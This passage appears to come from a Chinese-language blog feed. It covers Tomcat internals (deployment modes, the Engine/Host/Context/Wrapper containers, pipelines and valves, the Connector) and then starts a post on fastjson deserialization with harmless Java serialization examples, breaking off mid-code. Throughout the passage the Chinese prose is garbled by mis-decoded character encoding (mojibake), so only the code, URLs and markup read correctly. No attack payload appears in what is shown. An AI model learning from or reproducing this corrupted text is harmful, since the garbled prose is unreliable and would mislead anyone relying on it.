å°±å¯ä»¥çŸ¥é“RequestFacadeå°±æ˜¯å…¶ä¸­ä¸€ä¸ªå®ç°ç±»</p><p><img src="https://cdn.clown2024.cn/202409112036033.png" alt="image-20240911203618945"></p><p>ä¸è¿‡è¿™ä¸ªç±»åªæ˜¯ä¸€ä¸ªç±»ä¼¼é—¨é¢çš„ç±»ï¼Œé‡Œé¢çœŸæ­£çš„å®ç°æ˜¯Requestç±»ï¼Œé‡Œé¢çš„æ–¹æ³•æ›´å¤æ‚ï¼Œè¯¥ç±»ä¹Ÿæ˜¯å®ç°äº†Servletè§„èŒƒçš„ç±»</p><p><img src="https://cdn.clown2024.cn/202409121050908.png" alt="image-20240912105042783"></p><p>è¿™é‡Œå°±æ˜¯ç»™ä¸‹é¢çš„åˆ†æå½“ä¸ªå¼•å­ï¼Œå¼•å‘ä¸€ä¸‹æ€è€ƒã€‚</p><h3 id="jaråŒ…å’ŒwaråŒ…"><a href="#jaråŒ…å’ŒwaråŒ…" class="headerlink" title="jaråŒ…å’ŒwaråŒ…"></a>jaråŒ…å’ŒwaråŒ…</h3><p>æˆ‘ä»¬åœ¨tomcatéƒ¨ç½²é¡¹ç›®çš„æ—¶å€™ï¼Œå¯ä»¥å°†webé¡¹ç›®æ‰“åŒ…æˆwaråŒ…ç„¶åéƒ¨ç½²åˆ°tomcatçš„webappsç›®å½•ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409121053527.png" alt="image-20240912105338467"></p><p>å¯åŠ¨tomcatçš„æ—¶å€™ä»–å°±ä¼šè‡ªåŠ¨è§£å‹ï¼Œé‡Œé¢çš„å†…å®¹å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/202409121054829.png" alt="image-20240912105432764"></p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨server.xmlé‡Œé¢è®¾ç½®æ˜¯å¦è¿›è¡Œè‡ªåŠ¨è§£å‹</p><p><img src="https://cdn.clown2024.cn/202409121055233.png" alt="image-20240912105551171"></p><p>é‚£ä¹ˆjaråŒ…å‘¢ï¼Ÿ</p><p>å…¶å®jarçš„å†…å®¹å’ŒwaråŒ…è§£å‹å‡ºæ¥æ˜¯æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«çš„ï¼Œjarå’ŒwaråŒ…ä¸»è¦æ˜¯tomcatå¯åŠ¨æ—¶ç”¨æ¥åŒºåˆ†è¿™æ˜¯ä¸€ä¸ªä¾èµ–è¿˜æ˜¯ä¸€ä¸ªåº”ç”¨</p><h3 id="tomcatåº”ç”¨çš„å‡ ç§éƒ¨ç½²æ–¹å¼"><a href="#tomcatåº”ç”¨çš„å‡ ç§éƒ¨ç½²æ–¹å¼" class="headerlink" title="tomcatåº”ç”¨çš„å‡ ç§éƒ¨ç½²æ–¹å¼"></a>tomcatåº”ç”¨çš„å‡ ç§éƒ¨ç½²æ–¹å¼</h3><p>éƒ¨ç½²çš„å‡ ç§æ–¹å¼å¯ä»¥åœ¨<strong>HostConfig#deployApps</strong>ä¸­çœ‹åˆ°</p><p><img src="https://cdn.clown2024.cn/202409121100464.png" alt="image-20240912110054380"></p><ol><li>æè¿°ç¬¦éƒ¨ç½²</li><li>waråŒ…éƒ¨ç½²</li><li>æ–‡ä»¶å¤¹éƒ¨ç½²ï¼Œå°±æ˜¯å°†warè§£å‹çš„æ–‡ä»¶å¤¹ç›´æ¥æ”¾åˆ°webappsä¸‹é¢ï¼Œå’ŒwaråŒ…éƒ¨ç½²æ²¡ä»€ä¹ˆåŒºåˆ«</li></ol><blockquote><p>æºç ä¸­å¯ä»¥çœ‹åˆ°tomcatéƒ¨ç½²åº”ç”¨çš„æ—¶å€™æ˜¯è¿›è¡Œå¤šçº¿ç¨‹éƒ¨ç½²çš„</p></blockquote><p><strong>æè¿°ç¬¦éƒ¨ç½²</strong></p><p>æè¿°ç¬¦éƒ¨ç½²ç”¨çš„æ˜¯&lt;Context&gt;æ ‡ç­¾ï¼Œæ¯”å¦‚æˆ‘è¦å¸ƒç½®ä¸Šé¢çš„åº”ç”¨å¯ä»¥åœ¨server.xmlè¿™æ ·é…ç½®</p><p><img src="https://cdn.clown2024.cn/202409121117862.png" alt="image-20240912111717790"></p><p>docBaseå°±æ˜¯åº”ç”¨çš„ç›®å½•ï¼Œåˆ°æ—¶å€™tomcatå°±ä¼šä»è¯¥ç›®å½•æŸ¥æ‰¾æ‰€éœ€è¦çš„èµ„æºæ¯”å¦‚æˆ‘ä»¬çš„classæ–‡ä»¶</p><h3 id="context"><a href="#Context" class="headerlink" title="Context"></a>Context</h3><p>Contextçš„æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œæºç ä¸­å°±æœ‰ä¸€ä¸ªå«åšContextçš„æ¥å£</p><p><img src="https://cdn.clown2024.cn/202409121149984.png" alt="image-20240912114943927"></p><p>ä»–ç»§æ‰¿è‡ªä¸€ä¸ªContaineræ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥å»çœ‹çœ‹Containeræœ‰å“ªäº›ç»§æ‰¿æ¥å£ï¼Œé‡Œé¢å°±åŒ…å«ç€tomcatçš„å››å¤§å®¹å™¨</p><h2 id="tomcatå®¹å™¨"><a href="#Tomcatå®¹å™¨" class="headerlink" title="Tomcatå®¹å™¨"></a>Tomcatå®¹å™¨</h2><p><img src="https://cdn.clown2024.cn/202409121151081.png" alt="image-20240912115147007"></p><p>tomcatçš„å››å¤§å®¹å™¨ï¼š</p><ul><li><p>Contextï¼šå°±æ˜¯ä¸€ä¸ªwebåº”ç”¨ç¨‹åºï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢é…ç½®çš„ç¨‹åºï¼Œé…ç½®åœ¨HostèŠ‚ç‚¹ä¸‹é¢</p></li><li><p>Hostï¼šè¡¨ç¤ºä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œä¸€ä¸ªè™šæ‹Ÿä¸»æœºä¸‹é¢å¯ä»¥æœ‰å¾ˆå¤šçš„åº”ç”¨</p><p><img src="https://cdn.clown2024.cn/202409121154456.png" alt="image-20240912115408390"></p><p>nameå°±æ˜¯ä¸»æœºåï¼ŒappBaseå°±æ˜¯åº”ç”¨ç›®å½•ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦æ”¾åœ¨webappsä¸‹é¢</p></li><li><p>Engineï¼šå­—é¢æ„æ€å¼•æ“ï¼ŒHostæ˜¯Engineçš„å­èŠ‚ç‚¹</p><p><img src="https://cdn.clown2024.cn/202409121157589.png" alt="image-20240912115730532"></p><p>åœ¨Engineé‡Œé¢ï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥å®šä¹‰å¤šä¸ªè™šæ‹Ÿä¸»æœºï¼Œæ‰€ä»¥ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥å°†ä¸åŒçš„åº”ç”¨æ”¾åœ¨ä¸åŒçš„ä¸»æœºä¸‹ï¼Œé€šè¿‡ä¸åŒçš„ä¸»æœºåè®¿é—®å…·ä½“åº”ç”¨ï¼Œä¸è‡³äºå°†æ‰€æœ‰åº”ç”¨æ”¾åœ¨localhostä¸‹é¢ã€‚</p></li><li><p>Wrapperï¼šå®ƒå®é™…ä¸Šå°±å°è£…ç€ä¸€ä¸ªServletï¼Œè´Ÿè´£ç®¡ç†æ•´ä¸ªServletçš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒ…æ‹¬è£…è½½ã€åˆå§‹åŒ–ã€èµ„æºå›æ”¶ç­‰ã€‚</p></li></ul><blockquote><p><img src="https://cdn.clown2024.cn/202409121216408.png" alt="image-20240912121655347"></p><p>æˆ‘ä»¬æ­£å¸¸ä¼šç»§æ‰¿ä¸€ä¸ªHttpServletï¼Œæ‰€æœ‰è®¿é—®è¿™ä¸ªServletçš„è¯·æ±‚æ˜¯å…±ç”¨ä¸€ä¸ªServletå®ä¾‹ä¹Ÿå°±æ˜¯å•ä¾‹æ¨¡å¼ï¼Œä½†å¦‚æœå®ç°SingleThreadModelæ¥å£çš„è¯å°±æ˜¯æ¯ä¸ªè¯·æ±‚å•ç‹¬æ‹¥æœ‰ä¸€ä¸ªå®ä¾‹</p></blockquote><p>æ•´ä¸ªå®¹å™¨çš„å±‚çº§ç»“æ„å°±å¦‚ä¸‹ï¼š<br>Engine&#x3D;&#x3D;ã€‹Host&#x3D;&#x3D;ã€‹Context&#x3D;&#x3D;ã€‹Wrapper&#x3D;&#x3D;ã€‹Servlet</p><p>å†è®²è®²ä¸ºä»€ä¹ˆè¦å¤šä¸€ä¸ªWrapperï¼Œå› ä¸ºæˆ‘ä»¬æœ‰æ—¶å€™ä¼šæœ‰å¤šä¸ªServletå®ä¾‹ï¼Œå…¨æ”¾åœ¨Contextä¸‹é¢ä¼šä¸å¥½ç®¡ç†ï¼Œæ‰€ä»¥å°±ç”¨Wrapperå°†Servletå®ä¾‹æŒ‰ç…§ç±»å‹ç®¡ç†èµ·æ¥ï¼Œæ‰€ä»¥å­˜å‚¨ç»“æ„ç±»ä¼¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Engine:<br>List&lt;Host&gt;<br>Host:<br>List&lt;Context&gt;<br>Context<br>List&lt;Wrapper&gt; list;<br>Wrapper---Servletç±»<br>List&lt;Servlet&gt; servlets;<br></code></pre></td></tr></table></figure><h3 id="pipeline"><a href="#Pipeline" class="headerlink" title="Pipeline"></a>Pipeline</h3><p>è¿™é‡Œä¹Ÿå¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html">https://www.cnblogs.com/coldridgeValley/p/5816414.html</a></p><p>pipelineç¿»è¯‘è¿‡æ¥å°±æ˜¯ç®¡é“ï¼Œæ¯ä¸€ä¸ªå®¹æ˜“éƒ½æœ‰ä¸€ä¸ªç®¡é“ç»„ä»¶ï¼Œpipelineé‡Œé¢åˆæœ‰valveé˜€é—¨</p><p>æ‰€ä»¥ä¸Šé¢çš„ç»“æ„åˆå¯ä»¥ä¼˜åŒ–æˆè¿™æ ·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Engine:<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Host&gt;<br>Host:<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Context&gt;<br>Context<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Wrapper&gt; list;<br>Wrapper---Servletç±»<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Servlet&gt; servlets;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„Requestå¯¹è±¡æƒ³è¦æœ€ç»ˆservleté‡Œé¢çš„doGetç­‰æ–¹æ³•ï¼Œä¼šç»è¿‡å‰é¢ä¸€ç³»åˆ—çš„å®¹å™¨ã€ç®¡é“ã€é˜€é—¨ã€‚</p><p>æ¯ä¸ªç®¡é“æœ€é‡è¦çš„æ˜¯æœ€åä¸€ä¸ªé˜€é—¨ï¼Œå› ä¸ºä»–è¦è´Ÿè´£å°†requestå¾€ä¸‹ä¸€ä¸ªå®¹å™¨è¿›è¡Œä¼ é€’ï¼Œæ‰€ä»¥æœ€åä¸€ä¸ªé˜€é—¨æ˜¯tomcatæå‰å†™å¥½çš„ã€‚</p><p><strong>ValveèŠ‚ç‚¹</strong></p><p>è¯¥èŠ‚ç‚¹é…ç½®åœ¨HostèŠ‚ç‚¹ä¸‹é¢ï¼Œå¯ä»¥é…ç½®ç»è¿‡è¯¥é˜€é—¨æ—¶éœ€è¦åšä»€ä¹ˆï¼Œæˆ‘ä»¬åªéœ€è¦å»å®ç°æˆ–ç»§æ‰¿valveç›¸å…³çš„æ¥å£æˆ–ç±»å³å¯è‡ªå·±é…ç½®</p><p><img src="https://cdn.clown2024.cn/202409121354703.png" alt="image-20240912135432620"></p><p>æ¯”å¦‚ä¸‹é¢çš„è®°å½•æ—¥å¿—</p><p><img src="https://cdn.clown2024.cn/202409121200163.png" alt="image-20240912120035093"></p><h3 id="standardwrapper"><a href="#StandardWrapper" class="headerlink" title="StandardWrapper"></a>StandardWrapper</h3><p>è¿™é‡Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹Wrapperçš„pipelineçš„æœ€åä¸€ä¸ªvalveï¼Œå› ä¸ºä»–æ˜¯ç›´æ¥å’Œservletæ¥è§¦çš„ï¼›</p><p>Wrapperçš„å®ç°ç±»æ˜¯StandardWrapper</p><p><img src="https://cdn.clown2024.cn/202409121358782.png" alt="image-20240912135850663"></p><p>è¿™ä¸ªvalveå°±æ˜¯æˆ‘ä»¬è¯´çš„æœ€åä¸€ä¸ªvalve</p><p><img src="https://cdn.clown2024.cn/202409121400857.png" alt="image-20240912140039778"></p><p>å…·ä½“çš„é€»è¾‘åœ¨StandardWrapperValveçš„invokeæ–¹æ³•é‡Œé¢ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæ¥å—äº†Requestå’ŒResponse</p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ä»–é‡Œé¢ä¸€äº›å…³é”®çš„æ­¥éª¤</p><p><img src="https://cdn.clown2024.cn/202409121956314.png" alt="image-20240912195619220"></p><p>è¿™é‡Œæ˜¯åˆ†é…servletå®ä¾‹çš„åœ°æ–¹ï¼Œæ–¹æ³•é‡Œçš„å…·ä½“é€»è¾‘å°±ä¸åˆ†æï¼ŒçŸ¥é“ä»–çš„ä½œç”¨å°±å¥½</p><p><img src="https://cdn.clown2024.cn/202409121957566.png" alt="image-20240912195722497"></p><p>ç„¶åè¿™é‡Œç”Ÿæˆäº†ä¸€ä¸ªfilterchainï¼Œå°†æˆ‘ä»¬çš„requestã€wrapperã€serveltéƒ½å°è£…äº†è¿›å»ï¼Œè¿™é‡Œçš„filterchainå°±æ˜¯æˆ‘ä»¬å‰é¢æåˆ°Filter</p><p><img src="https://cdn.clown2024.cn/202409122000325.png" alt="image-20240912200056244"></p><p>ç„¶åæœ€ç»ˆçš„æ“ä½œå°±æ˜¯åœ¨æˆ‘ä»¬çš„doFilteré‡Œé¢è¿›è¡Œï¼Œæˆ‘ä»¬è‡ªå·±è¦å»ºç«‹Filterä¹Ÿæ˜¯åƒå†™servletä¸€æ ·ï¼Œå†™ä¸€ä¸ªç±»ç»§æ‰¿Filterç›¸å…³çš„æ¥å£ï¼Œç„¶ååœ¨web.xmlä¸­é…ç½®ï¼Œå’Œè¦è¿‡æ»¤çš„servletå¯¹åº”èµ·æ¥</p><p><img src="https://cdn.clown2024.cn/202409122007925.png" alt="image-20240912200740837"></p><p>åé¢çš„è°ƒç”¨æµç¨‹å°±è‡ªå·±è°ƒä¸€ä¸‹æºç çœ‹çœ‹å°±å¥½äº†</p><h2 id="tomcat-connector"><a href="#Tomcat-Connector" class="headerlink" title="Tomcat Connector"></a>Tomcat Connector</h2><p>æˆ‘ä»¬åœ¨å‰é¢çš„Tomcatæ¶æ„å›¾å¯ä»¥çœ‹åˆ°æœ‰Connectorç»„ä»¶ï¼Œtomcatæœ‰ä¸¤ä¸ªæ ¸å¿ƒåŠŸèƒ½ï¼š</p><p>1.å¤„ç† Socket è¿æ¥ï¼Œè´Ÿè´£ç½‘ç»œå­—èŠ‚æµä¸ Request å’Œ Response å¯¹è±¡çš„è½¬åŒ–ã€‚</p><p>2.åŠ è½½å’Œç®¡ç† Servletï¼Œä»¥åŠå…·ä½“å¤„ç† Request è¯·æ±‚ã€‚</p><p>æˆ‘ä»¬çš„Containerç»„ä»¶è´Ÿè´£å†…éƒ¨Servletçš„ç®¡ç†å’Œå¤„ç†è¿‡æ¥çš„Requestè¯·æ±‚ï¼Œé‚£å¤–éƒ¨ä¼ è¿‡æ¥çš„æ•°æ®æ˜¯æ€ä¹ˆç”ŸæˆRequestå¯¹è±¡çš„å‘¢ï¼Œè¿™é çš„å°±æ˜¯Connectorç»„ä»¶åˆ©ç”¨Socketæ¥å—æ“ä½œç³»ç»Ÿä¼ è¿‡æ¥çš„æ•°æ®ï¼Œç„¶åç”ŸæˆRequestå’ŒResponseå¯¹è±¡ã€‚</p><p>åœ¨Tomcatä¸­æœ‰ä¸€ä¸ªConnectorç±»å¯ä»¥å»çœ‹çœ‹ä»–çš„setProtocolæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409221831079.png" alt="image-20240922183030860"></p><p>ä»–è¿™é‡Œä¼šæ ¹æ®é€‰æ‹©ä¸åŒçš„å¤„ç†ç±»ï¼Œè¿™ä¸ªprotocolå°±æ˜¯æˆ‘ä»¬server.xmlé‚£é‡Œé…ç½®çš„</p><p><img src="https://cdn.clown2024.cn/202409221835409.png" alt="image-20240922183544328"></p><p>ç„¶åHTTP1.1å¯¹åº”çš„ä¸¤ä¸ªå¤„ç†ç±»çš„åŒºåˆ«å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">org.apache.coyote.http11.Http11AprProtocol ---BIO<br>org.apache.coyote.http11.Http11NioProtocol ---NIO<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™äº›ç±»å°±æ˜¯è´Ÿè´£socketçš„è¿æ¥ç®¡ç†å’Œæ•°æ®è¯»å–ï¼Œæˆ‘ä»¬å¯ä»¥è¿›å»çœ‹ä¸€ä¸‹ï¼Œè¿™é‡Œçœ‹ä¸€ä¸‹Http11NioProtocolçš„NIOè¯»å–æ•°æ®</p><p><img src="https://cdn.clown2024.cn/202409222021606.png" alt="image-20240922202104507"></p><p>è¿™é‡Œé¢newäº†ä¸€ä¸ªNioEndpointï¼Œè¿™å°±æ˜¯tomcatçš„ä¸€ä¸ªè¿æ¥å™¨ï¼Œç”¨äºå¤„ç†ç½‘ç»œè¿æ¥ï¼Œçœ‹ä¸€ä¸‹ä»–é‡Œé¢çš„æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409222023442.png" alt="image-20240922202358352"></p><p>è¿™é‡Œçš„Acceptorç±»æ˜¯ä¸€ä¸ªç”¨äºå¤šçº¿ç¨‹æ‰§è¡Œä»»åŠ¡çš„ï¼Œå› ä¸ºAbstractEndpoint.Acceptorå®ç°äº†Runnableæ¥å£ï¼Œç„¶åä¸‹é¢å¯ä»¥çœ‹åˆ°å®ƒacceptäº†socketè¿æ¥</p><p>é‚£æ¥å—äº†socketä¹‹åå°±éœ€è¦å»å¤„ç†è¿™ä¸ªsocketè¿æ¥ï¼Œæˆ‘ä»¬æ¥ç€çœ‹</p><p><img src="https://cdn.clown2024.cn/202409222031639.png" alt="image-20240922203110543"></p><p>è¿™é‡Œå°±ä¼šè°ƒç”¨ä¸€ä¸ªsetSocketOptionsæ¥å¤„ç†socketï¼Œå¦‚æœè¿”å›falseåˆ™å…³é—­socketï¼Œæˆ‘çœ‹è§†é¢‘é‡Œçš„ç‰ˆæœ¬ä»–çš„æ˜¯porcessSocketæ–¹æ³•(å¯èƒ½æ˜¯bioçš„æ–¹æ³•)ï¼Œæˆ‘çœ‹äº†æˆ‘çš„bioæ–¹æ³•å®ƒä½¿ç”¨çš„æ˜¯<strong>processSocketWithOptions</strong>æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409222045016.png" alt="image-20240922204517909"></p><p>nioè¿˜æ²¡å­¦ä¹ çœ‹ä¸å¤ªæ˜ç™½ï¼Œä½†æ˜¯æœ€ç»ˆå°±æ˜¯åœ¨è¿™é‡Œå¤„ç†äº†ï¼ŒBIOå°±æ˜¯ä½¿ç”¨çº¿ç¨‹æ± çš„æ–¹å¼æ¥è¯»å–socketæ•°æ®</p><p><img src="https://cdn.clown2024.cn/202409222049587.png" alt="image-20240922204936475"></p><p>è¿™æ˜¯bioçš„è¯»å–æ–¹å¼ï¼Œç„¶åç»§ç»­å¾€ä¸‹è·Ÿå°±æ˜¯ä¸€äº›æ•°æ®è§£æç„¶åæ„é€ Requestå¯¹è±¡ï¼Œå°±ä¸åˆ†æï¼Œæœ‰ä¸ªå¤§æ¦‚æ¦‚å¿µå°±è¡Œã€‚</p>]]></content>
      
      
      <categories>
          
          <category> javaåŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjsonååºåˆ—åŒ–</title>
      <link href="/2024/08/24/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/08/24/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="fastjsonä»‹ç»"><a href="#fastjsonä»‹ç»" class="headerlink" title="fastjsonä»‹ç»"></a>fastjsonä»‹ç»</h1><p>å®˜æ–¹githubåœ°å€ï¼š<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p><p>fastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°†Java Beanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚</p><p><strong>ç®€å•ä¾‹å­</strong></p><p>ç”¨Jsonçš„toJSONStringæ–¹æ³•å°†pojoç±»è½¬æ¢æˆå­—ç¬¦ä¸²</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Test1;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Studentæ„é€ å‡½æ•°&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student.setName(<span class="hljs-string">&quot;clown&quot;</span>);<br>        student.setAge(<span class="hljs-number">23333</span>);<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteClassName));<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteEnumUsingToString));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408281554948.png" alt="image-20240828155427856"></p><p>è¿™é‡Œçš„<strong>SerializerFeature.WriteClassName</strong>é¡¾åæ€ä¹‰å°±æ˜¯æŒ‡å®šåºåˆ—åŒ–å‡ºæ¥çš„å­—ç¬¦ä¸²çš„æ ¼å¼ï¼Œè¿™é‡Œå°±æ˜¯å†™å‡ºç±»åå’Œé”®å€¼å¯¹å½¢å¼ï¼Œæ›´å¤šçš„å¯ä»¥çœ‹æºç å°è¯•</p><p>JSON.parseObjectå°†å­—ç¬¦ä¸²è½¬æ¢å›pojo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Test1;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Studentæ„é€ å‡½æ•°&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student.setName(<span class="hljs-string">&quot;clown&quot;</span>);<br>        student.setAge(<span class="hljs-number">23333</span>);<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteClassName));<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteEnumUsingToString));<br>        <span class="hljs-comment">//è½¬å˜å›pojo</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.clown.Test1.Student\&quot;,\&quot;age\&quot;:23333,\&quot;name\&quot;:\&quot;clown\&quot;&#125;&quot;</span>, Student.class, Feature.SupportNonPublicField);<br>        System.out.println(obj);<br>        System.out.println(obj.getClass().getName());<br>        System.out.println(obj.getName() + <span class="hljs-string">&quot; &quot;</span> + obj.getAge());<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408281555070.png" alt="image-20240828155545016"></p><p>è¿™é‡Œæ³¨æ„è¦å†™å…¨ç±»åä¸ç„¶ä¼šæŠ¥é”™</p><p>è¿™é‡Œçš„<strong>Feature.SupportNonPublicField</strong>é¡¾åæ€ä¹‰ä¹Ÿæ˜¯è¿˜åŸçš„ç‰¹ç‚¹ï¼Œè¿™é‡Œæ˜¯è¿˜åŸç§æœ‰å±æ€§</p><p>ç„¶åæˆ‘ä»¬æ³¨æ„åˆ°è¿™é‡Œè½¬æ¢æˆpojoå¯¹è±¡æ—¶ä¼šè°ƒç”¨æ„é€ å‡½æ•°ï¼Œå…¶å®è¿˜ä¼šè°ƒç”¨ä»–çš„setå’Œgetæ–¹æ³•ï¼Œæ‰€ä»¥fastjsonçš„ååºåˆ—åŒ–æŒ‡çš„å¹¶ä¸æ˜¯javaåŸç”Ÿçš„ååºåˆ—åŒ–ï¼Œè€Œæ˜¯ä»–jsonè½¬åŒ–çš„è¿‡ç¨‹ã€‚</p><p>å°†ä»£ç æ”¹ä¸€ä¸‹çœ‹ä¸€ä¸‹æ•ˆæœ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Test1;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Studentæ„é€ å‡½æ•°&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span 